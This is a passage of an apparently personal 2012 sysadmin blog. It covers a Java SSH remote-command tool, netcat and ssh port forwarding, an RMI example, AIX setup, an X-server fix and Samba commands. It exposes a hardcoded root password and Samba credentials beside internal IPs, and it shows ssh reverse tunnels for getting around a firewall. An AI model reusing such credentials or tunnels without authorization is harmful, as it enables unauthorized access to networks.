&lt;pattern&gt;%-4relative [%thread] %-5level %class - %msg%n&lt;/pattern&gt;</span><br><span class="line">		&lt;/layout&gt;</span><br><span class="line">	&lt;/appender --&gt;</span><br><span class="line"></span><br><span class="line">  &lt;root level=&quot;off&quot;&gt;</span><br><span class="line">    &lt;appender-ref ref=&quot;STDOUT&quot; /&gt;</span><br><span class="line">  &lt;/root&gt;</span><br><span class="line">&lt;/configuration&gt;</span><br></pre></td></tr></table></figure>

<h3 id="coding-App-java"><a href="#coding-App-java" class="headerlink" title="coding App.java"></a>coding App.java</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">package dh;</span><br><span class="line"></span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.util.concurrent.TimeUnit;</span><br><span class="line"></span><br><span class="line">import net.schmizz.sshj.SSHClient;</span><br><span class="line">import net.schmizz.sshj.common.IOUtils;</span><br><span class="line">import net.schmizz.sshj.connection.channel.direct.Session;</span><br><span class="line">import net.schmizz.sshj.connection.channel.direct.Session.Command;</span><br><span class="line"></span><br><span class="line">public class App &#123;</span><br><span class="line">  private static final String df_command = &quot;df -g|head -3|tail -2&quot;;</span><br><span class="line">  private static final String recon_command = &quot;/tmp/xx/pps-recon.sh&quot;;</span><br><span class="line">  private static final String user = &quot;root&quot;;</span><br><span class="line">  private static final String passwd = &quot;pass3822&quot;;</span><br><span class="line">  private static final String wap01fingerprint = &quot;5a:34:f2:12:5f:2b:6c:8a:7d:8e:f0:1b:ca:1a:cb:f7&quot;;</span><br><span class="line">  private static final String wap02fingerprint = &quot;2a:97:e4:7b:50:e2:8a:5c:38:ae:d4:bf:fa:8c:ee:01&quot;;</span><br><span class="line"></span><br><span class="line">  public void diskCheck() throws IOException &#123;</span><br><span class="line">    run(&quot;10.13.135.71&quot;, wap01fingerprint, df_command);</span><br><span class="line">    run(&quot;10.13.135.72&quot;, wap02fingerprint, df_command);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  private void restartRecon() throws IOException &#123;</span><br><span class="line">    run(&quot;10.13.135.71&quot;, wap01fingerprint, recon_command);</span><br><span class="line">    run(&quot;10.13.135.72&quot;, wap02fingerprint, recon_command);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  private void run(String host, String fingerprint, String command)</span><br><span class="line">      throws IOException &#123;</span><br><span class="line">    final SSHClient ssh = new SSHClient();</span><br><span class="line">    //ssh.loadKnownHosts();</span><br><span class="line"></span><br><span class="line">    try &#123;</span><br><span class="line">      ssh.addHostKeyVerifier(fingerprint);</span><br><span class="line"></span><br><span class="line">      ssh.connect(host);</span><br><span class="line">      ssh.authPassword(user, passwd);</span><br><span class="line">      final Session session = ssh.startSession();</span><br><span class="line">      try &#123;</span><br><span class="line">        final Command cmd = session.exec(command);</span><br><span class="line">        System.out.println(&quot;&lt;&lt;&quot; + host + &quot;&gt;&gt; -- &quot; + IOUtils.readFully(cmd.getInputStream())</span><br><span class="line">            .toString());</span><br><span class="line">        cmd.join(5, TimeUnit.SECONDS);</span><br><span class="line">        //System.out.println(&quot;\n** exit status: &quot; + cmd.getExitStatus());</span><br><span class="line">      &#125; finally &#123;</span><br><span class="line">        session.close();</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; finally &#123;</span><br><span class="line">      ssh.disconnect();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  public static void main(String... args) throws IOException &#123;</span><br><span class="line">    App app = new App();</span><br><span class="line">    app.diskCheck();</span><br><span class="line">    app.restartRecon();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="run-mvn-compile-package"><a href="#run-mvn-compile-package" class="headerlink" title="run: mvn compile package"></a>run: <code>mvn compile package</code></h3><h3 id="file-structure-as-below"><a href="#file-structure-as-below" class="headerlink" title="file structure as below:"></a>file structure as below:</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">src</span><br><span class="line">├─main</span><br><span class="line">│  ├─java</span><br><span class="line">│  │  └─dh</span><br><span class="line">│  │          App.java</span><br><span class="line">│  │</span><br><span class="line">│  └─resources</span><br><span class="line">│          logback.xml</span><br><span class="line">│</span><br><span class="line">└─test</span><br><span class="line">    └─java</span><br><span class="line">        └─dh</span><br><span class="line">                AppTest.java</span><br></pre></td></tr></table></figure>

<h3 id="run-program-in-command-line-run-bat"><a href="#run-program-in-command-line-run-bat" class="headerlink" title="run program in command line run.bat"></a>run program in command line run.bat</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">@echo off</span><br><span class="line">java -cp target/ssh-remote-1.0-SNAPSHOT.jar;C:/Users/HPUser/.m2/repository/ch/qos/logback/logback-core/0.9.29/logback-core-0.9.29.jar;C:/Users/HPUser/.m2/repository/ch/qos/logback/logback-classic/0.9.29/logback-classic-0.9.29.jar;C:/Users/HPUser/.m2/repository/net/schmizz/sshj/0.8.0/sshj-0.8.0.jar;C:/Users/HPUser/.m2/repository/org/slf4j/slf4j-api/1.6.1/slf4j-api-1.6.1.jar dh.App</span><br><span class="line">rem mvn exec:java -Dexec.mainClass=&quot;dh.App&quot;</span><br><span class="line">rem mvn exec:java -Dexec.mainClass=&quot;dh.App&quot; -Dexec.classpathScope=runtime</span><br></pre></td></tr></table></figure>

      
    </div>
    <footer>
      
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>




  <article id="post-IP OR Port-forwarding" class="h-entry post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time class="dt-published" datetime="2012-06-25T08:29:30.000Z"><a href="/2012/06/25/IP%20OR%20Port-forwarding/">2012-06-25</a></time>
      
      
  
    <h1 class="title"><a href="/2012/06/25/IP%20OR%20Port-forwarding/">IP/Port forwarding</a></h1>
  

    </header>
    <div class="e-content entry" itemprop="articleBody">
      
        <h3 id="nix"><a href="#nix" class="headerlink" title="*nix"></a>*nix</h3><p>rinetd (<a target="_blank" rel="noopener" href="http://www.boutell.com/rinetd/">http://www.boutell.com/rinetd/</a>)</p>
<p>netcat ( <a target="_blank" rel="noopener" href="http://netcat.sourceforge.net/">http://netcat.sourceforge.net/</a>)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkfifo backpipe</span><br><span class="line">nc -l 12345  0&lt;backpipe | nc www.google.com 80 1&gt;backpipe</span><br></pre></td></tr></table></figure>

<p>socat (<a target="_blank" rel="noopener" href="http://www.dest-unreach.org/socat/">http://www.dest-unreach.org/socat/</a>)</p>
<p>iptables (<a target="_blank" rel="noopener" href="http://www.netfilter.org/downloads.html">http://www.netfilter.org/downloads.html</a>)</p>
<h3 id="ssh"><a href="#ssh" class="headerlink" title="ssh"></a>ssh</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">ssh user@10.13.135.47 -L 7001:10.13.135.54:9081 -g</span><br><span class="line">端口7001在当前运行这个命令的机器上打开</span><br><span class="line">ssh user@10.13.135.47 -R 7001:10.13.135.54:9081 -g</span><br><span class="line">端口7001在10.13.135.47机器上打开</span><br><span class="line"></span><br><span class="line">A跟B是同一个网络，B跟C是一个网络，C跟D同一个网络，但A不能到达D。</span><br><span class="line"></span><br><span class="line">B机上运行</span><br><span class="line">ssh root@C_host -L 7001:D_host:9081 -g</span><br><span class="line"></span><br><span class="line">B机上运行</span><br><span class="line">netstat -an|grep 7001</span><br><span class="line">会看到0.0.0.0的端口7001在监听（如果没有-g，会显示127.0.0.1:7001在监听）</span><br><span class="line"></span><br><span class="line">这样A可以通过B的7001端口发送数据可以到达D的9081端口，其中B到C的数据链路是被加密了的，而A-&gt;B和C-&gt;D是没有的。</span><br><span class="line"></span><br><span class="line">反向代理</span><br><span class="line">如果A可以到B，但由于防火墙导致B不能到A，那么就可以使用ssh -R，让端口开在B。例如A是proxy，希望让B可以访问internet，可以使用如下方法：</span><br><span class="line">在A上运行：ssh -R 7001:localhost:8080 B</span><br><span class="line">再在B上运行：export http_proxy=http://localhost:7001</span><br><span class="line"></span><br><span class="line">题外话：</span><br><span class="line">如果在C上配置nginx/squid了，这样可以使用C为proxy。</span><br><span class="line">A-&gt;B(7001)-&gt;C(9081)-&gt;C(80/443)</span><br></pre></td></tr></table></figure>

<h3 id="java"><a href="#java" class="headerlink" title="java"></a>java</h3><p>mina (<a target="_blank" rel="noopener" href="http://mina.apache.org/">http://mina.apache.org</a>)<br>netty (<a target="_blank" rel="noopener" href="http://netty.io/">http://netty.io</a>)<br>openportmapper (<a target="_blank" rel="noopener" href="http://openportmapper.sf.net/">http://openportmapper.sf.net</a>)</p>
<h3 id="window"><a href="#window" class="headerlink" title="window"></a>window</h3><p>netcat (<a target="_blank" rel="noopener" href="http://joncraton.org/blog/46/netcat-for-windows">http://joncraton.org/blog/46/netcat-for-windows</a>)<br>ncat (<a target="_blank" rel="noopener" href="http://nmap.org/">http://nmap.org</a>)<br>3proxy (<a target="_blank" rel="noopener" href="http://3proxy.ru/">http://3proxy.ru/</a>)</p>
<h2 id="Ref"><a href="#Ref" class="headerlink" title="Ref:"></a>Ref:</h2><p><a target="_blank" rel="noopener" href="http://en.wikipedia.org/wiki/Netcat">http://en.wikipedia.org/wiki/Netcat</a><br><a target="_blank" rel="noopener" href="http://www.debianadmin.com/howto-use-ssh-local-and-remote-port-forwarding.html">http://www.debianadmin.com/howto-use-ssh-local-and-remote-port-forwarding.html</a><br><a target="_blank" rel="noopener" href="http://fsfoundry.org/codefreak/2006/05/18/ssh-port-forwarding-basics/">http://fsfoundry.org/codefreak/2006/05/18/ssh-port-forwarding-basics/</a><br><a target="_blank" rel="noopener" href="https://www.ibm.com/developerworks/cn/linux/l-cn-sshforward/">https://www.ibm.com/developerworks/cn/linux/l-cn-sshforward/</a><br><a target="_blank" rel="noopener" href="http://blog.moonforest.org/2011/02/use-sshtunnel-and-nginx-as-proxy-on-android/">http://blog.moonforest.org/2011/02/use-sshtunnel-and-nginx-as-proxy-on-android/</a><br><a target="_blank" rel="noopener" href="http://madeye.me/2011/02/10/ssh-tunnel-on-the-android-application-puff-android-edition">http://madeye.me/2011/02/10/ssh-tunnel-on-the-android-application-puff-android-edition</a></p>

      
    </div>
    <footer>
      
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>




  <article id="post-RMI学习" class="h-entry post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time class="dt-published" datetime="2012-06-21T07:38:29.000Z"><a href="/2012/06/21/RMI%E5%AD%A6%E4%B9%A0/">2012-06-21</a></time>
      
      
  
    <h1 class="title"><a href="/2012/06/21/RMI%E5%AD%A6%E4%B9%A0/">RMI学习</a></h1>
  

    </header>
    <div class="e-content entry" itemprop="articleBody">
      
        <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">package rmi;</span><br><span class="line"></span><br><span class="line">import java.rmi.Remote;</span><br><span class="line">import java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line">public interface MyService extends Remote &#123;</span><br><span class="line">  void sayHi(String name) throws RemoteException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">package rmi;</span><br><span class="line"></span><br><span class="line">import java.rmi.RemoteException;</span><br><span class="line">import java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line">public class MyServiceImpl extends UnicastRemoteObject implements MyService &#123;</span><br><span class="line"></span><br><span class="line">  private static final long serialVersionUID = -8550790423811608199L;</span><br><span class="line"></span><br><span class="line">  protected MyServiceImpl() throws RemoteException &#123;</span><br><span class="line">    super();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  public void sayHi(String name) &#123;</span><br><span class="line">    System.out.println(&quot;hello &quot; + name);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">package rmi;</span><br><span class="line"></span><br><span class="line">import java.net.MalformedURLException;</span><br><span class="line">import java.rmi.Naming;</span><br><span class="line">import java.rmi.RMISecurityManager;</span><br><span class="line">import java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line">public class RmiServer &#123;</span><br><span class="line">  public static void main(String[] args) &#123;</span><br><span class="line">    if (System.getSecurityManager() == null) &#123;</span><br><span class="line">      System.setSecurityManager(new RMISecurityManager());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // String server = &quot;0.0.0.0&quot;;</span><br><span class="line">    String server = &quot;10.13.139.98&quot;;</span><br><span class="line">    String rmiPort = &quot;2012&quot;;</span><br><span class="line">    System.out.println(&quot;starting server &quot; + server);</span><br><span class="line">    try &#123;</span><br><span class="line">      Naming.rebind(&quot;rmi://&quot; + server + &quot;:&quot; + rmiPort + &quot;/MyService&quot;,</span><br><span class="line">          new MyServiceImpl());</span><br><span class="line">    &#125; catch (RemoteException e) &#123;</span><br><span class="line">      // TODO Auto-generated catch block</span><br><span class="line">      e.printStackTrace();</span><br><span class="line">    &#125; catch (MalformedURLException e) &#123;</span><br><span class="line">      // TODO Auto-generated catch block</span><br><span class="line">      e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">package rmi;</span><br><span class="line"></span><br><span class="line">import java.net.MalformedURLException;</span><br><span class="line">import java.rmi.Naming;</span><br><span class="line">import java.rmi.NotBoundException;</span><br><span class="line">import java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line">public class Client &#123;</span><br><span class="line">  public static void morning() &#123;</span><br><span class="line">    String server = &quot;10.13.139.100&quot;;</span><br><span class="line">    String rmiPort = &quot;2012&quot;;</span><br><span class="line">    try &#123;</span><br><span class="line">      MyService myService = (MyService) Naming.lookup(&quot;rmi://&quot; + server</span><br><span class="line">          + &quot;:&quot; + rmiPort + &quot;/MyService&quot;);</span><br><span class="line">      System.out.println(&quot;myService = &quot; + myService);</span><br><span class="line">      myService.sayHi(&quot;Forest, Good morning!&quot;);</span><br><span class="line">    &#125; catch (MalformedURLException e) &#123;</span><br><span class="line">      e.printStackTrace();</span><br><span class="line">    &#125; catch (RemoteException e) &#123;</span><br><span class="line">      e.printStackTrace();</span><br><span class="line">    &#125; catch (NotBoundException e) &#123;</span><br><span class="line">      e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  public static void main(String[] args) &#123;</span><br><span class="line">    morning();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="my-policy"><a href="#my-policy" class="headerlink" title="my.policy"></a>my.policy</h4><figure class="highlight plaintext"><figcaption><span>codeBase "file:///C:/workspace/rmi/bin/*"&#123;</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">  permission java.net.SocketPermission &quot;0.0.0.0:2012&quot;, &quot;connect,resolve&quot;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h4 id="Run-commands"><a href="#Run-commands" class="headerlink" title="Run commands,"></a>Run commands,</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">C:\j2sdk1.4.2_10\bin\rmic.exe rmi.MyServiceImpl</span><br><span class="line"></span><br><span class="line">rmiregistry.exe 2012</span><br><span class="line"></span><br><span class="line">java.exe -Djava.rmi.server.hostname=10.13.139.98 -Djava.rmi.server.codebase=file:///C:/workspace/rmi/bin/ -Djava.security.policy=my.policy -cp . rmi.RmiServer</span><br><span class="line"></span><br><span class="line">java.exe -cp . rmi.Client</span><br></pre></td></tr></table></figure>

<h3 id="注意："><a href="#注意：" class="headerlink" title="注意："></a>注意：</h3><ol>
<li>如果机器上有多个IP，可以使用java.rmi.server.hostname指定其中一个，如果打印lookup后的对象，会看到MyServiceImpl_Stub[RemoteStub [ref: [endpoint:<a href="remote">10.13.139.98:1085</a>,objID:[f72617:1380931e011:-8000, 0]]]] </li>
<li>java.rmi.server.codebase&#x3D;file:&#x2F;&#x2F;&#x2F;C:&#x2F;workspace&#x2F;rmi&#x2F;bin&#x2F;，windows下file后要有3个&#x2F;，和最后要有个&#x2F; </li>
<li>my.policy中的*，代表该目录下的所有全限定类拥有权限，是classpath的路径，而不是在.class的目录</li>
</ol>
<h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><p><a target="_blank" rel="noopener" href="http://docs.oracle.com/javase/1.4.2/docs/guide/rmi/getstart.doc.html">http://docs.oracle.com/javase/1.4.2/docs/guide/rmi/getstart.doc.html</a></p>

      
    </div>
    <footer>
      
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>




  <article id="post-AIX-Lib-path-setting-&amp;-AIX-5.x-library-url" class="h-entry post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time class="dt-published" datetime="2012-06-20T09:39:39.000Z"><a href="/2012/06/20/AIX-Lib-path-setting-&-AIX-5.x-library-url/">2012-06-20</a></time>
      
      
  
    <h1 class="title"><a href="/2012/06/20/AIX-Lib-path-setting-&-AIX-5.x-library-url/">AIX Lib path setting &amp; AIX 5.x library url</a></h1>
  

    </header>
    <div class="e-content entry" itemprop="articleBody">
      
        <h4 id="Download-wget-from-http-computer-refuge-org-classiccmp-aixpdslib"><a href="#Download-wget-from-http-computer-refuge-org-classiccmp-aixpdslib" class="headerlink" title="Download wget from http://computer-refuge.org/classiccmp/aixpdslib/"></a>Download wget from <a target="_blank" rel="noopener" href="http://computer-refuge.org/classiccmp/aixpdslib/">http://computer-refuge.org/classiccmp/aixpdslib/</a></h4><h4 id="Run-command"><a href="#Run-command" class="headerlink" title="Run command"></a>Run command</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">uncompress wget.1.10.2.tar.Z</span><br><span class="line">tar xvf wget.1.10.2.tar</span><br><span class="line"></span><br><span class="line">crontab -l</span><br><span class="line">20 13,19 * * 1-5 /usr/local/bin/wget -q --no-cache -O /dev/null http://aa.bb.com</span><br></pre></td></tr></table></figure>

<h4 id="then-set-library-path-as-below"><a href="#then-set-library-path-as-below" class="headerlink" title="then set library path as below,"></a>then set library path as below,</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">export LD_LIBRARY_PATH=/tmp/xx/tools/usr/local/lib</span><br><span class="line">export LIBPATH=$LD_LIBRARY_PATH</span><br></pre></td></tr></table></figure>

<p>Reference<br><a target="_blank" rel="noopener" href="http://computer-refuge.org/classiccmp/aixpdslib/">http://computer-refuge.org/classiccmp/aixpdslib/</a><br><a target="_blank" rel="noopener" href="http://www.perzl.org/aix/index.php?n=Main.HomePage">http://www.perzl.org/aix/index.php?n=Main.HomePage</a><br><a target="_blank" rel="noopener" href="http://gnome.bullfreeware.com/aixtoolbox/RPMS/ppc/">http://gnome.bullfreeware.com/aixtoolbox/RPMS/ppc/</a><br><a target="_blank" rel="noopener" href="http://www.bullfreeware.com/">http://www.bullfreeware.com/</a><br><a target="_blank" rel="noopener" href="http://bio.gsi.de/DOCS/AIX/aixpdslib.seas.ucla.edu/">http://bio.gsi.de/DOCS/AIX/aixpdslib.seas.ucla.edu/</a></p>

      
    </div>
    <footer>
      
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>




  <article id="post-Crystal-Clear出现X-connection-to-0.0-broken- exp..." class="h-entry post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time class="dt-published" datetime="2012-06-12T02:57:44.000Z"><a href="/2012/06/12/Crystal-Clear%E5%87%BA%E7%8E%B0X-connection-to-0.0-broken-%20exp.../">2012-06-12</a></time>
      
      
  
    <h1 class="title"><a href="/2012/06/12/Crystal-Clear%E5%87%BA%E7%8E%B0X-connection-to-0.0-broken-%20exp.../">Crystal Clear出现X connection to :0.0 broken (exp...</a></h1>
  

    </header>
    <div class="e-content entry" itemprop="articleBody">
      
        <p>Crystal Clear遇到个问题，在AIX的native_stderr.log看到X connection to :0.0 broken (explicit kill or server shutdown).<br>运行xhost，hold住了，没有反应。</p>
<p>折腾了一天，解决方法很简单，将DISPLAY由:0.0改为:100.0，虽然有些古怪，but it works.</p>
<p>这个问题让自己了解到更多X Server的内容。</p>
<h2 id="要启动AIX上的X-Server"><a href="#要启动AIX上的X-Server" class="headerlink" title="要启动AIX上的X Server"></a>要启动AIX上的X Server</h2><p><code>/usr/dt/bin/dtlogin -daemon</code></p>
<h3 id="然后产生如下进程："><a href="#然后产生如下进程：" class="headerlink" title="然后产生如下进程："></a>然后产生如下进程：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/usr/lpp/X11/bin/X -x abx -x dbe -x GLX -D /usr/lib/X11//rgb -T -force :0 -auth /var/dt/A:0-vcgtMa</span><br><span class="line">/usr/bin/X11/X -force -vfb -x abx -x dbe -x GLX :100</span><br></pre></td></tr></table></figure>

<p>如果DISPLAY&#x3D;:100.0 用 <code>netstat -an|grep 100</code> 会看到6100端口开启了，等待连接。</p>
<h3 id="以下是一些摘录的内容："><a href="#以下是一些摘录的内容：" class="headerlink" title="以下是一些摘录的内容："></a>以下是一些摘录的内容：</h3><p>The X server can be disabled and then killed with the following</p>
<p>commands:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/usr/dt/bin/dtconfig -d</span><br><span class="line">/usr/dt/bin/dtconfig -kill</span><br></pre></td></tr></table></figure>

<p>The X server can be restored after applying the fix with the following commands:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/usr/dt/bin/dtconfig -e</span><br><span class="line">/usr/bin/startsrc -s dtsrc</span><br></pre></td></tr></table></figure>

<h2 id="Others"><a href="#Others" class="headerlink" title="Others"></a>Others</h2><ol>
<li>Open a terminal emulator window, and log in as root.</li>
<li>Obtain the process ID of the Login Manager by typing the following:<br><code>cat /var/dt/Xpid</code></li>
<li>Stop the Login Manager by typing:<br><code>kill -term process_id</code></li>
</ol>
<h3 id="Starting-the-Common-Desktop-Environment-manually-Use-this-procedure-to-start-the-Common-Desktop-Environment-manually"><a href="#Starting-the-Common-Desktop-Environment-manually-Use-this-procedure-to-start-the-Common-Desktop-Environment-manually" class="headerlink" title="Starting the Common Desktop Environment manually. Use this procedure to start the Common Desktop Environment manually."></a>Starting the Common Desktop Environment manually. Use this procedure to start the Common Desktop Environment manually.</h3><ol>
<li>Log in to your system as root.</li>
<li>At the command line, type the following:<br><code>/usr/dt/bin/dtlogin -daemon</code><br><code>tail /var/dt/Xerrors</code></li>
</ol>
<h2 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h2><p><a target="_blank" rel="noopener" href="https://groups.google.com/group/comp.unix.aix/browse_thread/thread/9ccd826368903176?pli=1">https://groups.google.com/group/comp.unix.aix/browse_thread/thread/9ccd826368903176?pli=1</a><br><a target="_blank" rel="noopener" href="http://blog.csdn.net/huang_tg/article/details/6120409">http://blog.csdn.net/huang_tg/article/details/6120409</a></p>

      
    </div>
    <footer>
      
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>




  <article id="post-Samba-&amp;-add-route-in-AIX" class="h-entry post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time class="dt-published" datetime="2012-06-06T09:39:47.000Z"><a href="/2012/06/06/Samba-&-add-route-in-AIX/">2012-06-06</a></time>
      
      
  
    <h1 class="title"><a href="/2012/06/06/Samba-&-add-route-in-AIX/">Samba &amp; add route in AIX</a></h1>
  

    </header>
    <div class="e-content entry" itemprop="articleBody">
      
        <p> Samba</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">smbclient -L 10.13.135.99 -U ITDEV%ITDEV -D /itshare</span><br><span class="line">smbclient //10.13.135.99/itshare -U ITDEV%ITDEV</span><br><span class="line">smbclient //10.13.135.99/itshare -U ITDEV%ITDEV -c &quot;ls&quot;</span><br></pre></td></tr></table></figure>

<p> Two network cards in server, so add route to let my local machine can be accessible in server</p>
